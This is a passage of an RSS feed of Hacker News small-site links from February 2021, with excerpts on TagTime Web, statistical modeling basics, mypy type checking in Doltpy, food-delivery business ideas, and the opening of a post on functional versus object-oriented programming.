<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><article itemprop="articleBody" id="content"><p>Recently I’ve been working on <a href="https://ttw.smitop.com/">TagTime Web</a> (my server, but you can host your own). It’s an <a href="https://github.com/smittyvb/ttw">open-source</a> web-based version of the original <a href="https://github.com/tagtime/TagTime">TagTime</a>. It uses <em>stochastic time tracking</em>, which randomly samples what you are doing through out the day (on average 45 minutes apart by default). <a href="http://messymatters.com/tagtime/">This page</a> explains it quite well. I have also made <a href="https://www.youtube.com/watch?v=cJpE018QEkQ">a video</a> about how this type of time tracking works, and a <a href="https://www.youtube.com/watch?v=FwpF0fqh7uU">demonstration video</a>.</p><p>Here are some features it has:</p><ul><li>Each tag gets a unique colour based on the name of it</li><li>Tag autocomplete</li><li>Dark mode</li><li>Mobile support</li><li>Offline support (it is a PWA)</li><li>Filtering pings</li><li>Charts!</li></ul><p><a href="https://ttw.smitop.com/">Check it out!</a></p></article></div></div>]]>
            </description>
            <link>https://smitop.com/post/ttw/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26232552</guid>
            <pubDate>Tue, 23 Feb 2021 00:40:58 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[On the Basics of (Statistical) Modeling]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26232497">thread link</a>) | @dcu
<br/>
February 22, 2021 | https://blog.chewxy.com/2021/02/17/modeling-basics/ | <a href="https://web.archive.org/web/*/https://blog.chewxy.com/2021/02/17/modeling-basics/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div role="main">
<div>
<div>
<article role="main">
<p>I had a very interesting chat with a few data science students yesterday. Part of the chat involved the idea of statistical modeling. Throughout the chat, it occured to me that the students didn’t have a very good grasp of what modeling is. To their credit, they were proficient in the techniques of linear regression, and deep learning, but I got the sense that they were very much pushing buttons and watching things happen rather than understanding what they were actually doing. There was no sense of a big picture view.</p>
<p>This has been happening quite a lot lately. I find it somewhat alarming. This blog post is a semi-transcript of what I said last night. It aims to be as simple as possible.</p>

<p>A model is a representation of reality. It’s what we think reality looks like.</p>
<p>For example, we live on Planet Earth, in a solar system. We can build models of our Solar System. Here’s an example of a model of our Solar System.</p>

<div>
<figure itemprop="associatedMedia" itemscope="" itemtype="http://schema.org/ImageObject">
<p><img itemprop="thumbnail" src="https://blog.chewxy.com/wp-content/uploads/2021/modeling/orrery.jpg" alt="An Orrery of our Solar System. Photograph by Smabs Sputzer, published with a CC BY 2.0 licence. Source: https://www.flickr.com/photos/10413717@N08/7527137708">
</p>
<a href="https://blog.chewxy.com/wp-content/uploads/2021/modeling/orrery.jpg" itemprop="contentUrl"></a>
<figcaption>
<p>An Orrery of our Solar System. Photograph by Smabs Sputzer, published with a CC BY 2.0 licence. Source: https://www.flickr.com/photos/<a href="https://blog.chewxy.com/cdn-cgi/l/email-protection" data-cfemail="84b5b4b0b5b7b3b5b3c4cab4bc">[email&nbsp;protected]</a>/7527137708</p>
</figcaption>
</figure>
</div>
<p>As a child, such models of our solar system endlessly fascinate. I would spend hours thinking about how the planets moved. I would play and watch the planets spin around its spindles. I understood that there was a force called gravity that caused the planets to orbit the sun. As I grew older, the physical model of our Solar System is gradually replaced by <a href="https://en.wikipedia.org/wiki/Kepler%27s_laws_of_planetary_motion">three laws</a>.</p>
<p>There are parts of the model we can study:</p>
<ul>
<li>What is the shape of the orbits</li>
<li>How the planets move</li>
<li>Why do planets move thus</li>
</ul>
<p>These are sub-models of the model of our Solar System. The shape of the orbit is given by Kepler’s First Law. How planets move is given by Kepler’s Second and Third Law. Why do planets move thus is given by Newtonian mechanics.</p>
<p>Each of Kepler’s laws have an equation governing them. So we can say the equations model our Solar System. The equations are the model of our Solar System. These equations describe something static (the shape of the orbit) and represent something dynamic (how the planets move). What used to be physical motion in a physical model can now be written down on a piece of paper, an equation representing the real thing.</p>

<p>There are many ways of making a model. Sometimes it’s useful to have a physical understanding of something. <a href="https://blog.chewxy.com/2021/01/09/sars-cov-2/">I built the 2019-SARS-CoV-2 virion</a> to help me have a better understanding of the coronavirus that caused the pandemic in 2020. Now, I’m no biologist, so my model is crude. My model is extremely physical. Despite this, it gave me an understanding of how a mRNA vaccine might work. It gave me confidence over what actual proper scientists are doing.</p>
<p>So making a physical model is one way. But what if we want something more rigorous? The usual way is to resort to some sort of formalism. Various fields have various formalisms. For example, in chemistry, you use chemical equations. However, the most common formalism would be a mathematical equation. Maths equations are used in physics, economics, biology, and many other fields.</p>
<p>So how do you create an equation that becomes a model of something? There are two ways:</p>
<ol>
<li>Generate an equation.</li>
<li>Find an equation from data.</li>
</ol>
<p>In the large scheme of things, both of these amount to the same thing: generating an equation. I’ll talk about that in a later section. For now, when I say “model generation” I mean generating an equation that models reality.</p>
<h2 id="how-do-you-generate-an-equation">How Do You Generate An Equation?</h2>
<p>The simplest way of generating an equation is to randomly generate one by writing down symbols on a piece of paper.</p>
<p>That’s daft, you say. You’d be hard pressed to find a equation that adequately describes the situation!</p>
<p>That’s why most model generation comes from <a href="https://en.wikipedia.org/wiki/First_principle">first principles</a>. In using the Solar System example, if we accept Newton’s law of universal graviatation ($F = G{\frac {Mm}{r^{2}}}$), then we can work our way to find Kepler’s third law. Kepler’s other laws require other first principles such as trigonometry.</p>
<p>The key is that you understand a subject well enough that you may generate further models about the subject using your basic understanding.</p>
<p>However, random generation has its place. In fact, from here on, whenever I write “generate a model”, you may think of a person randomly coming up with math equations.</p>
<h2 id="how-do-you-find-an-equation-from-data">How Do You Find An Equation From Data?</h2>
<p>There may be cases where first principles may not be used. This is often the case in new fields.</p>
<p>So the next best way is to find an equation from data. There are many ways to do them. Regression analysis is one such way of finding an equation from data. Let’s look at a simple example of linear regression with one variable.</p>
<p>The fundamental idea of a linear regression is that you plot your data points, and draw a straight line through the plot (line A). Each data point would be some distance away from line. Sum those distances up and square them. Call it the “error”. Now draw another line through the plot (line B) and find the errors of B. Keep doing until you find a line that has the lowest amount of errors.</p>
<p>This is the line-of-best-fit. Given that all straight lines on a plot can be described by an equation that looks like $y = mx +C$, the equation that describes the line of best fit (e.g. $y=2x + 1$) is the model.</p>
<p>This idea of model building extends all the way to deep neural networks. They key being the model is built by looking at the relationships between the variables that make up a data point.</p>

<p>The whole point of creating a model is to reflect reality. I could well come up with a model of gravity that says this: all objects exert a force on each other that is quadratic on the distance between them - written as $F = d(a, b)^2$. But does this reflect reality? No.</p>
<p>How do I know this? I know this because I can test it. I can collect data, and then check if the data fits my model. In the silly example above, it’s trivial to check with a counterpoint: I am able push something off my desk. If the force is solely based on distance, then as my hand approaches the object, the force should get smaller and smaller to the point that I am unable to affect the object.</p>
<p>In many courses about regression analyses, the R² values are often taught to students as a measure of how good one’s model is<span><span></span><span>I find this to be mostly true about "data science" courses/bootcamps, but not more traditional uni level course on regression/economics/statistics</span></span>. It’s not! A R² value is how good the fit of data to the line is. In some sense you may think of this as the inverse of “how good is your model” . It’s more “how much data fits in your model”. Indeed, the R² value is indicative of how much variance of your data is covered by the model.</p>
<p>This is not to say that the courses are wrong. The statement that “R² tells you how good your model is” is a very subtle statement. Let’s unpack them. Let’s say you found a line of best fit that is described by the formula $y = 2x + 15$. This is the model that we have “generated”. Now we want to see how much of reality (our dataset) is described by the model. It is in this sense that R² represents the notion of how “good” a model is.</p>
<p>Now it seems a bit weird, given that we used the dataset to find the line of best fit, and then we turn around and say we generated a model, not let’s test to see how good it is. There seems to be a bit of circular logic to it. However there are a lot of theoretical work on why the line of best fit found by a ordinary least squares (OLS) regression is a good model “generator” - the wikipedia article on <a href="https://en.wikipedia.org/wiki/Ordinary_least_squares">OLS</a> covers quite a bit, as does the <a href="https://en.wikipedia.org/wiki/Gauss%E2%80%93Markov_theorem">Gauss-Markov theorem</a> article. Most textbooks also lay out proofs of why OLS estimators are BLUE (Best Linear Unbiased Estimator).</p>
<p>Here I want to point out that “reality” is itself just a sample. The dataset that you use to generate a model is just a sample. This is where conscious sampling of data is important. Let’s imagine we are training a machine learning system to recognize faces. My social circle are White or Asian. So if I ask my social circle to send me some photographs of their faces to train a machine learning system, then the machine learning system would not be able to recognize faces that are not White or Asian! Clearly this is not a good representation of reality.</p>
<p>This trivial example only scratches the surface of equitable conscious collection of sample “reality” for the sake of model building. This topic is a very deep topic and it’ll take many blog posts to talk about it. So I shall leave it be for now.</p>
<p>In more advanced machine learning modeling systems (e.g: deep learning systems), it is common to split the dataset into “training” and “testing” datasets. The model is trained on the training dataset and tested on the testing dataset. This is to ensure that the model does not only model “reality” that is in the training dataset, but can also generalize to previously unseen data.</p>
<p>What I am trying to convey here is that sanity checks against reality is a good thing. We should do them more often.</p>

<p>Having said that, we have to accept that models are just that - models. They are not reality. George Box had a good saying:</p>
<blockquote>
<p>All models are wrong. But some are useful.</p>
</blockquote>
<p>The key is to find a model that is useful enough for what you need to do. Let the natural philosophers worry about the most accurate models of reality.</p>

<p>Humanity is always generating models. Individually, in our brains, we generate internal models that are corrected every second of the day. Consider catching a ball. Your brain generates a model of physical reality - no equations here - telling us where the ball is going to be. As the ball arcs through the air, we update the models in our brain, getting better and better predictions, resulting in us catching the ball. Or in my case, the ball lands on my face.</p>
<p>Communally, we generate models too. The invention of writing and speech allowed us to share models with other individuals. We started using things like maths equations to make our meanings clear. Our …</p></article></div></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://blog.chewxy.com/2021/02/17/modeling-basics/">https://blog.chewxy.com/2021/02/17/modeling-basics/</a></em></p>]]>
            </description>
            <link>https://blog.chewxy.com/2021/02/17/modeling-basics/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26232497</guid>
            <pubDate>Tue, 23 Feb 2021 00:33:09 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Code Quality with Mypy]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26232204">thread link</a>) | @max-hoffman
<br/>
February 22, 2021 | https://www.dolthub.com/blog/2021-02-22-mypy-and-doltpy/ | <a href="https://web.archive.org/web/*/https://www.dolthub.com/blog/2021-02-22-mypy-and-doltpy/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div data-cy="blog-post-text"><h2>Dolt</h2>
<p>Dolt is an SQL-database with Git-versioning.
The goal of <a href="https://github.com/dolthub/doltpy">Doltpy</a>, in
concert with <a href="http://github.com/dolthub/dolt">Dolt</a>, is to solve
reproducibility and versioning problems for data and machine
learning engineers using Python.</p>
<h2>Mypy</h2>
<p>Mypy was created by Guido van Rossum, the primary developer of the
Python language, as a way to apply
<a href="https://www.python.org/dev/peps/pep-0008/">PEP standards</a> to Python source
code. When lines of code are added to the Python core libraries,
their respective mypy stubs are updated lockstep.</p>
<p>So when we fix mypy errors we are enforcing rules of the Python type system.
This point is subtle but important: mypy errors when your code is not doing
what you've declared it should do. Static checking can't anticipate what
input your code will be fed at runtime, but as a developer you can write
code that is self-consistent with function and type signatures.</p>
<p>Adding type-hints without enforcement is a common anti-pattern.
Mypy is separately installed from Python and its typing modules -- it
is up to the developer to actually validate type-hints after adding them.
Code with contradictory typing documentation can mislead
developers and users alike. Mypy is that bridge between type-aesthetics
and type-correctness.</p>
<p>Mypy involves three main modules:</p>
<ul>
<li><a href="https://github.com/python/mypy">mypy</a>: A source code parsing and
applying PEP constraints.</li>
<li><a href="https://github.com/python/typeshed">typeshed</a>: Type-stubs core and
3rd party libraries; code whose implementations are
correctness-checked when used in new code.</li>
<li><a href="https://github.com/python/typing">typing</a>: Modules for compatibility
between python versions.</li>
</ul>
<p>All three of these modules are regularly used when using mypy (<code>typing</code>
less so if you only suport one Python version). One addendum is that you
can define custom type stubs in your own code, in the same manner <code>typeshed</code>
provides type stubs for popular pip packages, like
<a href="https://github.com/python/typeshed/tree/master/stubs/boto/boto">boto</a>
and
<a href="https://github.com/python/typeshed/tree/master/stubs/requests/requests">requests</a>.</p>
<h2>Examples</h2>
<h3>Typing inconsistency</h3>
<p>We use <code>mypy</code> in Doltpy 2.0 to help ensure code-quality. Below is an
an example from Doltpy 1.0 to demonstrate mypy in action:</p>
<div data-language="python"><pre><code><span>def</span> <span>log</span><span>(</span>self<span>,</span> number<span>:</span> <span>int</span> <span>=</span> <span>None</span><span>,</span> commit<span>:</span> <span>str</span> <span>=</span> <span>None</span><span>)</span> <span>-</span><span>&gt;</span> OrderedDict<span>:</span>
    args <span>=</span> <span>[</span><span>"log"</span><span>]</span><span>:</span>
    <span>if</span> number<span>:</span>
        args<span>.</span>extend<span>(</span><span>[</span><span>"--number"</span><span>,</span> number<span>]</span><span>)</span></code></pre></div>
<p>Inside the <code>log</code> function signature, <code>number: int</code> correctly reflects the developer intent,
but <code>args: List[str]</code> disallows integers. This means that calling <code>Dolt.log(1)</code>
fails with an error, while <code>Dolt.log("1")</code> succeeds.</p>
<p>The intended behavior is clear, and mypy preemptively notices the inconsistency:</p>
<div data-language="bash"><pre><code><span>&gt;</span> python -m mypy <span>.</span>
example.py:4: error: List item <span>1</span> has incompatible <span>type</span> <span>"int"</span><span>;</span> expected <span>"str"</span></code></pre></div>
<p>fixing the type inconsistency restores the expected behavior:</p>
<div data-language="python"><pre><code><span>def</span> <span>log</span><span>(</span>self<span>,</span> number<span>:</span> <span>int</span> <span>=</span> <span>None</span><span>,</span> commit<span>:</span> <span>str</span> <span>=</span> <span>None</span><span>)</span> <span>-</span><span>&gt;</span> OrderedDict<span>:</span>
    args <span>=</span> <span>[</span><span>"log"</span><span>]</span><span>:</span>
    <span>if</span> number<span>:</span>
    args<span>.</span>extend<span>(</span><span>[</span><span>"--number"</span><span>,</span> <span>str</span><span>(</span>number<span>)</span><span>]</span><span>)</span></code></pre></div>
<p>and makes mypy happy:</p>
<div data-language="bash"><pre><code><span>&gt;</span> python -m mypy <span>.</span>
Success: no issues found <span>in</span> <span>1</span> <span>source</span> <span>file</span></code></pre></div>
<h3>Custom typing stub</h3>
<p>As a final example, here are first few lines for a custom type stub of the
<code>doltpy.cli.Dolt</code>
<a href="https://github.com/dolthub/doltpy/blob/master/doltpy/types/dolt.py%5D">class</a>
in doltpy:</p>
<div data-language="python"><pre><code><span>class</span> <span>DoltT</span><span>(</span>Generic<span>[</span>_T<span>]</span><span>)</span><span>:</span>
    _repo_dir<span>:</span> <span>str</span>

    <span>@abc<span>.</span>abstractmethod</span>
    <span>def</span> <span>repo_dir</span><span>(</span>self<span>)</span><span>:</span>
        <span>.</span><span>.</span><span>.</span>

    <span>@staticmethod</span>
    <span>@abc<span>.</span>abstractmethod</span>
    <span>def</span> <span>init</span><span>(</span>repo_dir<span>:</span> Optional<span>[</span><span>str</span><span>]</span> <span>=</span> <span>None</span><span>)</span> <span>-</span><span>&gt;</span> <span>"Dolt"</span><span>:</span>  
        <span>.</span><span>.</span><span>.</span></code></pre></div>
<p>After defining <code>class Dolt(DoltT)</code>, mypy will enforce our interface
the same way mypy enforces standard library and other 3rd party type
stubs. As a plus, code editors like VSCode should also give hints for
function signature definitions.</p>
<h2>Summary</h2>
<p>In this post I touched on the utility of using type-hints
with mypy, and the comparative pitfalls of using type-hints without.
We used specific examples from Doltpy to highlight the nature
of static type-checking, and how we use mypy in production at Dolthub.</p>
<p>Are you interested in learning more about Dolt and Doltpy?
<a href="https://docs.dolthub.com/getting-started/installation">Try it out</a>.
If you have any questions, come chat with us in our
<a href="https://discord.com/invite/RFwfYpu">Discord</a>.</p></div></div>]]>
            </description>
            <link>https://www.dolthub.com/blog/2021-02-22-mypy-and-doltpy/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26232204</guid>
            <pubDate>Mon, 22 Feb 2021 23:49:27 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The Guy Making a Million a Year Delivering Cookies to His Hood]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 2 (<a href="https://news.ycombinator.com/item?id=26232139">thread link</a>) | @freakandgeek
<br/>
February 22, 2021 | https://businessideas.ai/food-delivery/ | <a href="https://web.archive.org/web/*/https://businessideas.ai/food-delivery/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
            
<div>
    <main>
            <article>
    
    <div>
                <h3 id="a-deep-dive-on-opportunities-in-the-food-delivery-space"><em>A Deep Dive on Opportunities in the Food Delivery Space</em></h3><p>In this crazy Covid world we have seen the acceleration in delivery businesses and food is no different.</p><p>Of course by now you have probably heard about <a href="https://www.doordash.com/en-US">DoorDash</a>, <a href="https://www.grubhub.com/">GrubHub</a>, <a href="https://www.ubereats.com/">Uber Eats</a> and the like, but what if I told you there are tons of opportunities for us regular non-venture backed folk to also get in on this action?</p><p><em>Would you be interested?</em></p><p>Let's dig into this deeper.</p><h2 id="from-bc-to-ac">From BC to AC</h2><p>As you have probably personally experienced, it can be hard (or even impossible) to go out to eat like back in the good old BC days (<em>Before Covid</em>).</p><p>Drive through restaurants, take-out and delivery businesses have been propelled into accelerating growth as a result.</p><p>You should see the daily lines at my local Chick Fil-A. It is absolutely bonkers.</p><figure><blockquote><p lang="en" dir="ltr">I just waited in line at chick-fil-a for about 30 mins. <a href="https://t.co/I2gx9PeBxA">pic.twitter.com/I2gx9PeBxA</a></p>— Natisha Lance (@NatishaLance) <a href="https://twitter.com/NatishaLance/status/1360760913679286275?ref_src=twsrc%5Etfw">February 14, 2021</a></blockquote>

</figure><p>Despite the passing of time and new vaccines — masks, social distancing, and a limited public discourse lifestyle are still norms in many parts of the world.</p><p>In fact Dr. Fauci says we need to wear masks through 2022 and the CDC is now <a href="https://www.cbsnews.com/news/double-face-mask-covid-19-cdc/">actually suggesting wearing two masks</a>.</p><figure><blockquote><p lang="en" dir="ltr">Dr. Fauci says it's possible Americans will need to wear masks in 2022 even as the US may reach "a significant degree of normality" by year's end<a href="https://t.co/XLRwWIPMC9">https://t.co/XLRwWIPMC9</a> <a href="https://t.co/B3ntTpsKDH">pic.twitter.com/B3ntTpsKDH</a></p>— CNN Breaking News (@cnnbrk) <a href="https://twitter.com/cnnbrk/status/1363521124089294849?ref_src=twsrc%5Etfw">February 21, 2021</a></blockquote>

</figure><p>This trend will stick for some time. You may as well profit off of it.</p><figure><img src="https://cdn.getmidnight.com/e8ec67ee74ddbbc523b1af64568b015a/2021/02/crave-cookie.jpg" alt="Crave Cookie is Making Bank"></figure><h2 id="local-delivery-businesses-are-making-the-dough">Local Delivery Businesses are Making the Dough</h2><p>Would you imagine that a small family business of just a few handful of employees in a small California town selling nothing but two types of cookies is a million dollar business?</p><p>This is not science fiction. It is a reality.</p><p><a href="https://cravecookie.com/">Crave Cookie</a> is that business.</p><p>They have a very simple business model that you can replicate in your town. Let's walk through some of the things Crave Cookie has done that shows how this can be a <a href="https://businessideas.ai/business-ideas/">great business idea</a>.</p><p>Crave Cookie always has chocolate chip cookies and just one additional flavor of the week. Even a one person business could pull that off. It is inspiring to realize that huge menus are not needed to be a million dollar business.</p><p>Interestingly even after achieving huge success, they still have stuck with the two choices only model.</p><figure><img src="https://cdn.getmidnight.com/e8ec67ee74ddbbc523b1af64568b015a/2021/02/crave-pricing.png" alt="Crave Cookie Pricing"></figure><h3 id="smart-pricing-strategy">Smart Pricing Strategy</h3><p>You cannot just order one cookie from Crave as they sell <strong>boxes of cookies only</strong>. So the minimum order is $13.</p><p>They also charge for delivery with a reasonable price that does not feel like gouging. Also interestingly they point out:</p><blockquote>"We charge a flat $3.0 delivery fee whether you order 1 box or 100."</blockquote><p>So there is plenty of motivation for larger orders as the delivery fee feels close to free.</p><h3 id="special-sauce">Special Sauce</h3><p>If cookies delivered to your door is not enough of a differentiator, Crave also advertises that they deliver <strong>straight out of the oven</strong> and thus your cookies will <strong>arrive warm</strong>.</p><p>Can't you just about taste that?</p><p>This is a smart <em>special sauce ninja move</em>. Who does not dream of warm cookies delivered to their doorstep?</p><h2 id="similar-cookie-delivery-companies">Similar Cookie Delivery Companies</h2><p>If you want to dig into this model some more, there are a few interesting companies to check out:</p><ul><li><a href="https://insomniacookies.com/">https://insomniacookies.com</a></li><li><a href="https://www.cookiedelivery.com/">https://www.cookiedelivery.com</a></li><li><a href="https://www.midnightcookieco.com/">https://www.midnightcookieco.com</a></li></ul><h2 id="getting-started">Getting Started</h2><p>Some extra considerations about this business model:</p><ul><li>There are special local laws related to selling food. Research and understand these in depth before doing anything else.</li><li>Start by selling in your own neighborhood. 1) This is easier to network, spread the word, and gather feedback &amp; 2) Your deliveries are easily done.</li><li>Use <a href="https://nextdoor.com/">Nextdoor</a> and Facebook Marketplace to market your services and get the word out.</li><li>Do you have a special family recipe that would do well as a delivery service?</li></ul><h3 id="crave-cookie-media-for-further-study">Crave Cookie Media for Further Study</h3><p><em>Writing Code to Sell $200,000/Month of Cookies with Sam Eaton of Crave Cookie</em></p><figure><iframe width="200" height="113" src="https://www.youtube.com/embed/-CpVIetacIM?feature=oembed" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe></figure><p><em>Valley fans crave cookies, company expands</em></p><figure><iframe width="200" height="113" src="https://www.youtube.com/embed/2GX4OME_g64?start=7&amp;feature=oembed" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe></figure><h2 id="airbnb-food-service-model">Airbnb Food Service Model</h2><p>Another new wrinkle we have seen recently is what I call the <em>Airbnb food service model</em> (people in the know call these <a href="https://roaminghunger.com/blog/15623/ghost-kitchens-everything-you-must-know/">Ghost Kitchens</a>.)</p><p>Imagine selling millions of burgers to customers without having a kitchen, buying any beef, or having any employees?</p><figure><img src="https://cdn.getmidnight.com/e8ec67ee74ddbbc523b1af64568b015a/2021/02/mrbeast-burger.jpg" alt="The current menu at Mr Beast Burger"></figure><h3 id="introducing-mrbeast-burger">Introducing MrBeast Burger</h3><p>MrBeast in case you are unaware, is a <a href="https://www.youtube.com/channel/UCX6OQ3DkcsbYNE6H8uQQuVA">hugely popular YouTuber</a> with over 50 million subscribers.</p><p>MrBeast Burger launched with 300 locations. That would cost billions you say! How did they do it?</p><p>MrBeast Burger has their burgers made by partnering restaurants and they leverage local delivery networks to deliver the orders.</p><figure><img src="https://cdn.getmidnight.com/e8ec67ee74ddbbc523b1af64568b015a/2021/02/mrbeast-app.jpg" alt=""><figcaption>MrBeast Burger App</figcaption></figure><p>They simply provide the ordering front end with their app and the traffic based on MrBeast's gigantic popularity and marketing skills.</p><p>Just like Airbnb does not make beds or own any real estate — MrBeast owns no cows or flips any burgers.</p><p>Obviously few of us have the kind of reach to pull anything like this off. MrBeast Burger is selling nearly one million $$$ of burgers a month on the foundation of his huge audience.</p><p>But this is such a fascinating example of a creative and wildly successful food business, we had to cover that here.</p><p><em>I Opened A Restaurant That Pays You To Eat At It</em></p><figure><iframe width="200" height="113" src="https://www.youtube.com/embed/dg2Ag3e8W-Q?feature=oembed" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe></figure><p><em>Food Theory: MrBeast Burger Is NOT What You Think...</em></p><figure><iframe width="200" height="113" src="https://www.youtube.com/embed/uNLwgYG4EdA?feature=oembed" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe></figure><p><em>How MrBeast Makes $720,000/Month Dropshipping Burgers</em></p><figure><iframe width="200" height="113" src="https://www.youtube.com/embed/K3OuI9E0-EA?feature=oembed" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe></figure><h2 id="food-subscription-businesses">Food Subscription Businesses</h2><p>Subscription box businesses are not new and maybe the business model has even peaked — at least before Covid turned many into remote workers who rarely leave the house (<em>and thus buy more online</em>).</p><p>But subscription food businesses are worth mentioning as a consideration —especially as a possible side hustle.</p><p>Since this model is already around a decade old you will need to consider that the riches are in the niches. Do something unique and do it with some panache.</p><p>Consider for example that there are already at least a dozen <em>beef jerky subscription boxes</em>, so starting another one of those would be questionable decision making. </p><p>Picking food products for your subscription business like nothing else in existence ensures less competition.</p><h2 id="have-you-ever-tried-japanese-candy">Have You Ever Tried Japanese Candy?</h2><figure><img src="https://cdn.getmidnight.com/e8ec67ee74ddbbc523b1af64568b015a/2021/02/candy-japan.jpg" alt="Candy Japan Homepage"></figure><p>A good example of this is <a href="https://www.candyjapan.com/">Candy Japan</a>. Over the years this side project has sold about one million $$$ of Japanese candy.</p><p>In the beginning the business gathered a lot of interest and business mostly based on the utter uniqueness of the offering.</p><p>But with time the word gets out and now there are a few Japanese candy subscription box competitors out there (<a href="https://tokyotreat.com/">https://tokyotreat.com</a>, <a href="https://japancrate.com/">https://japancrate.com</a>, &amp; <a href="https://www.japancandybox.com/">https://www.japancandybox.com</a> to name a few)</p><p>Still even after several years — this is a profitable side project the owner says <a href="https://www.candyjapan.com/life-in-japan/what-it-costs-to-live-in-japan">covers most of his living expenses in Japan</a>.</p><p>If you can find an untapped niche, this could be a nice earning side business for someone. Just pick an interesting and unique food item.</p><p>CBD brownies anyone?</p><h3 id="more-about-candy-japan">More About Candy Japan</h3><ul><li><a href="https://www.starterstory.com/stories/starting-a-japanese-candy-subscription-service?upgrade=true&amp;successful_subscribe=true&amp;src=email_wall">Starting A Japanese Candy Subscription Service</a></li><li><a href="https://www.candyjapan.com/blog">Candy Japan Blog</a> (<em>plenty of insights on marketing efforts and other hindsights in running the business</em>)</li></ul><h3 id="one-more-thing-about-subscription-box-businesses">One More Thing about Subscription Box Businesses</h3><p>In one word...recurring revenue. Recurring revenue is a beautiful thing to the entrepreneur, as you can accurately predict your monthly revenue stream. This makes planning, marketing, and other elements of your business easier. You know what your revenues are going to be and usually can predict your growth as well.</p><p>This is the same reason why the Software as a Service (SaaS) model is so valuable and loved. Subscription box business are almost like SaaS for people who cannot code.</p><h2 id="selling-food-on-etsy-is-actually-a-thing">Selling Food on Etsy is Actually a Thing</h2><p>I don't know about you, but I just learned about how big food selling was on Etsy.</p><p>It makes sense to me now, but it blows my mind how much food selling is going on there. Just <a href="https://www.etsy.com/search?q=brownies">do a search on "brownies"</a> and you will see what I mean.</p><figure><img src="https://cdn.getmidnight.com/e8ec67ee74ddbbc523b1af64568b015a/2021/02/etsy-brownies.jpg" alt="Etsy Brownies"><figcaption>You get a brownie, and you, and you!</figcaption></figure><p>What is great about this is you could use Etsy for quick (and cheap!) experiments for gathering market intelligence. You could get answers on:</p><ul><li>What foods are popular to buy online?</li><li>What photos work best to drive orders?</li><li>What categories are the most successful?</li><li>What copy is most effective to sell my food item?</li></ul><h3 id="how-to-dominate-a-crowded-market-be-different-be-bold">How to Dominate a Crowded Market? Be Different, Be Bold</h3><p>As you can see there are a ton of brownie sellers on Etsy. But I found one seller who has sold well over $100K worth of treats.</p><figure><img src="https://cdn.getmidnight.com/e8ec67ee74ddbbc523b1af64568b015a/2021/02/dulce-baskets.jpg" alt=""></figure><p>Selling brownie gift baskets of close to $100 is a good way to increase your profit and sales volume. This is a separator from the pack that are mostly selling one batch of brownies at a time.</p><p>These make a unique gift for your favorite chocolate lover — whereas a simple batch of brownies is not exactly making a statement.</p><h3 id="more-on-etsy-food">More on Etsy Food</h3><figure><a href="https://www.etsy.com/legal/policy/food-and-edible-items/239327355460"><div><p>Food and Edible Items - Our House Rules | Etsy</p><p>Find the perfect handmade gift, vintage &amp; on-trend clothes, unique jewelry, and more… lots more.</p><p><img src="https://www.etsy.com/images/favicon.ico"></p></div><p><img src="https://i.etsystatic.com/11266858/d/il/c8a5e3/2871445103/il_340x270.2871445103_ot9g.jpg?version=0"></p></a></figure><h2 id="join-us-for-more">Join Us for More</h2><p>Because you liked this report — please <a href="https://businessideas.ai/#/portal/signup">become a Business Ideas subscriber</a>.</p><p>Continue getting more insights on interesting &amp; powerful business ideas to take your life to the next level.</p><figure><img src="https://cdn.getmidnight.com/e8ec67ee74ddbbc523b1af64568b015a/2021/02/business-ideas-logo-512-2.png" alt=""></figure>
                        <section>
                            <h2>Enjoying these posts? Subscribe for more</h2>
                            
                            <br>
                            
                        </section>
    </div>
        
</article>                    
                </main>
</div>
        </div></div>]]>
            </description>
            <link>https://businessideas.ai/food-delivery/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26232139</guid>
            <pubDate>Mon, 22 Feb 2021 23:40:40 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Functional vs. OO: The Debate That Imprecise Language Destroyed]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 1 (<a href="https://news.ycombinator.com/item?id=26232049">thread link</a>) | @BerislavLopac
<br/>
February 22, 2021 | https://chelseatroy.com/2021/02/22/functional-vs-oo-the-debate-that-imprecise-language-destroyed/ | <a href="https://web.archive.org/web/*/https://chelseatroy.com/2021/02/22/functional-vs-oo-the-debate-that-imprecise-language-destroyed/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="page">

			<!-- #masthead -->

			<div id="content">

	<section id="primary">
		<main id="main" role="main">

		
			<article id="post-8919">
	
	
		

	<div>
		<p><span><span>Reading Time: </span> <span>7</span> <span>minutes</span></span></p><h3>“Should I use functional or object-oriented programming?”</h3>



<p>A student asked me this as I closed out one of my Python Programming lectures in January.  In this context, the student meant “what should I use for my upcoming homework assignment,” but I didn’t realize that at first. On <em>most</em> occasions when I hear this question—usually in professional circles—the unspoken subtext is “always.” <em>Which of these two styles should I swear by as <strong>the</strong> right way to write code?</em> </p>



<p> A second later, the student clarified “…on this assignment, I mean.”</p>



<p>Too little, too late. My gears were already turning.</p>



<div><div>
<div><div>
<div><div>
